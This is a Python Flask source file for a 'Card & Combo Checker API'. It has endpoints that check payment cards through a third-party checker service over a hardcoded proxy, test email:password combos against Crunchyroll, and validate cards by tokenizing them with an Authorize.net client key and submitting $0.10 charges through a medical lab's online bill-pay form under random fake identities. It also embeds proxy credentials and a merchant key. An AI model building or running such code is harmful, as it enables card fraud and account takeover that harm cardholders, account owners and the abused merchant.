from flask import Flask, request, jsonify
import requests, random, string, uuid, json, os, time, logging

# ---- logging ----
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("checker_api")

app = Flask(__name__)

# ---- safer User-Agent rotation (no crash if fake_useragent unavailable) ----
FALLBACK_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]
try:
    from fake_useragent import UserAgent
    try:
        ua = UserAgent()
        USER_AGENT = ua.random or FALLBACK_UAS[0]
    except Exception:
        USER_AGENT = random.choice(FALLBACK_UAS)
except Exception:
    USER_AGENT = random.choice(FALLBACK_UAS)

logger.info("Using User-Agent: %s", USER_AGENT)

# environment defaults (you should set these in production)
AUTHNET_NAME = os.getenv("AUTHNET_NAME", "3c5Q9QdJW")
AUTHNET_CLIENTKEY = os.getenv(
    "AUTHNET_CLIENTKEY",
    "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
)

# small helper to parse JSON safely
def safe_get_json(response_text):
    try:
        return json.loads(response_text.lstrip("\ufeff").strip())
    except Exception:
        return None

# utility functions
def random_string(length):
    return ''.join(random.choices(string.ascii_letters, k=length))

def random_email():
    return f"{random_string(7).lower()}@gmail.com"

def mask_card(card):
    return card[:6] + "*" * (len(card) - 10) + card[-4:] if len(card) >= 10 else "*" * len(card)

# ---- HOME ----
@app.route("/")
def home():
    try:
        return jsonify({
            "api_name": "Card & Combo Checker API",
            "developer": "💻 Made by Sukhraj",
            "version": "1.0.0",
            "description": (
                "A simple API to check credit cards, generate tokens (Auth.net), "
                "and verify Crunchyroll combos. Supports GET and POST methods."
            ),
            "endpoints": {
                "/api/v1/checker/cc/stripe": {
                    "method": ["POST", "GET"],
                    "params": {"cc": "Card details or number (required)"},
                    "example": {
                        "GET": "/api/v1/checker/cc/stripe?cc=5154620000000000|12|25|123",
                        "POST": {"cc": "5154620000000000|12|25|123"}
                    }
                },
                "/api/v1/checker/cc/authnet": {
                    "method": ["POST", "GET"],
                    "params": {"cc": "Card format: number|month|year|cvv"},
                    "example": {
                        "GET": "/api/v1/checker/cc/authnet?cc=5154620000000000|12|25|123"
                    }
                },
                "/api/v1/checker/crunchyroll": {
                    "method": ["POST", "GET"],
                    "params": {"combo": "Email:Password pair (required)"},
                    "example": {
                        "GET": "/api/v1/checker/crunchyroll?combo=test@gmail.com:12345",
                        "POST": {"combo": "test@gmail.com:12345"}
                    }
                }
            },
            "status": "✅ API is live and ready to use",
            "note": "Use POST for secure/bulk checks."
        }), 200
    except Exception:
        logger.exception("Home handler error")
        return jsonify({"error": "Internal server error"}), 500

# ---- BIN / CARD CHECKER (stripe proxy) ----
@app.route("/api/v1/checker/cc/stripe", methods=["POST", "GET"])
def checker_cc():
    try:
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            cc = data.get("cc")
        else:
            cc = request.args.get("cc")

        if not cc:
            return jsonify({"error": "Missing 'cc' parameter"}), 400

        url = (
            "https://rockyysoon-fb0f.onrender.com/index.php"
            "?site=https://keyadream.com/"
            f"&cc={cc}"
            "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
        )

        resp = requests.get(url, timeout=15)
        json_body = safe_get_json(resp.text)
        if json_body is not None:
            return jsonify(json_body), 200
        return jsonify({"result": resp.text[:200], "status_code": resp.status_code}), 200

    except requests.RequestException as e:
        logger.exception("Network error in checker_cc")
        return jsonify({"error": "Upstream request failed", "detail": str(e)}), 502
    except Exception:
        logger.exception("checker_cc failed")
        return jsonify({"error": "Internal server error"}), 500

# ---- CRUNCHYROLL ----
@app.route("/api/v1/checker/crunchyroll", methods=["POST", "GET"])
def checker_crunchy():
    try:
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            combo = data.get("combo")
        else:
            combo = request.args.get("combo")

        if not combo:
            return jsonify({"error": "Missing 'combo' parameter"}), 400

        url = f"https://crunchy-ng.vercel.app/check?combo={combo}"
        resp = requests.get(url, timeout=15)
        json_body = safe_get_json(resp.text)
        if json_body is not None:
            return jsonify(json_body), 200
        return jsonify({"result": resp.text[:200], "status_code": resp.status_code}), 200

    except requests.RequestException as e:
        logger.exception("Network error in checker_crunchy")
        return jsonify({"error": "Upstream request failed", "detail": str(e)}), 502
    except Exception:
        logger.exception("checker_crunchy failed")
        return jsonify({"error": "Internal server error"}), 500

# ---- AUTH.NET TOKEN & PAYMENT ----
def generate_token(card_number, expiration_date, cvv):
    url = "https://api2.authorize.net/xml/v1/request.api"
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {"name": AUTHNET_NAME, "clientKey": AUTHNET_CLIENTKEY},
            "data": {
                "type": "TOKEN",
                "id": str(uuid.uuid4()),
                "token": {
                    "cardNumber": card_number,
                    "expirationDate": expiration_date,
                    "cardCode": cvv
                }
            }
        }
    }
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://avanticmedicallab.com",
        "Referer": "https://avanticmedicallab.com/",
        "User-Agent": USER_AGENT
    }

    try:
        r = requests.post(url, headers=headers, json=payload, timeout=15)
        parsed = safe_get_json(r.text) or {}
        if 'opaqueData' in parsed and 'dataValue' in parsed['opaqueData']:
            return {"ok": True, "token": parsed['opaqueData']['dataValue'], "raw": parsed}
        return {"ok": False, "error": "No token in response", "raw": parsed, "status_code": r.status_code, "text_snippet": r.text[:400]}
    except requests.RequestException as e:
        logger.exception("generate_token network error")
        return {"ok": False, "error": f"network error: {e}"}
    except Exception as e:
        logger.exception("generate_token error")
        return {"ok": False, "error": f"unexpected error: {e}"}

def submit_payment_form(opaque_token, expire_for_form="10/29"):
    url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"
    fname, lname, email = random_string(6), random_string(6), random_email()
    payload = {
        "wpforms[fields][1][first]": fname,
        "wpforms[fields][1][last]": lname,
        "wpforms[fields][17]": "0.10",
        "wpforms[fields][2]": email,
        "wpforms[fields][3]": "(219) 767-6687",
        "wpforms[fields][4][address1]": "New York",
        "wpforms[fields][4][city]": "New York",
        "wpforms[fields][4][state]": "NY",
        "wpforms[fields][4][postal]": "10080",
        "wpforms[fields][6]": "$ 0.10",
        "wpforms[authorize_net][opaque_data][descriptor]": "COMMON.ACCEPT.INAPP.PAYMENT",
        "wpforms[authorize_net][opaque_data][value]": opaque_token,
        "wpforms[authorize_net][card_data][expire]": expire_for_form,
        "action": "wpforms_submit",
        "page_url": "https://avanticmedicallab.com/pay-bill-online/",
        "page_title": "Pay Bill Online",
        "page_id": "3388"
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://avanticmedicallab.com",
        "Referer": "https://avanticmedicallab.com/pay-bill-online/",
        "User-Agent": USER_AGENT,
    }

    try:
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        try:
            return {"ok": True, "json": r.json(), "status_code": r.status_code}
        except Exception:
            return {"ok": True, "raw": r.text[:400], "status_code": r.status_code}
    except requests.RequestException as e:
        logger.exception("submit_payment_form network error")
        return {"ok": False, "error": f"network error: {e}"}
    except Exception as e:
        logger.exception("submit_payment_form unexpected error")
        return {"ok": False, "error": f"unexpected error: {e}"}

@app.route("/api/v1/checker/cc/authnet", methods=["GET", "POST"])
def checker_authnet():
    try:
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            cc_input = data.get("cc") or request.args.get("cc")
        else:
            cc_input = request.args.get("cc")

        if not cc_input:
            return jsonify({"error": "Missing 'cc' parameter"}), 400

        parts = cc_input.split("|")
        if len(parts) < 4:
            return jsonify({"error": "Invalid format. Use: number|month|year|cvv"}), 400

        card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        expiry_token = f"{month}{year[-2:]}" if len(year) >= 2 else f"{month}{year}"
        expiry_form = f"{month}/{year[-2:]}"

        token_res = generate_token(card, expiry_token, cvv)
        if not token_res.get("ok"):
            return jsonify({"status": "failed", "error": token_res.get("error"), "raw": token_res.get("raw", None)}), 200

        opaque = token_res["token"]
        submit_res = submit_payment_form(opaque, expire_for_form=expiry_form)

        return jsonify({
            "status": "ok",
            "card_masked": mask_card(card),
            "expiry": expiry_form,
            "token_masked": opaque[:6] + "..." if opaque else None,
            "payment_response": submit_res
        }), 200

    except Exception:
        logger.exception("checker_authnet failed")
        return jsonify({"error": "Internal server error"}), 500

# ---- RUN APP (for local dev) ----
if __name__ == "__main__":
    app.run(debug=True)
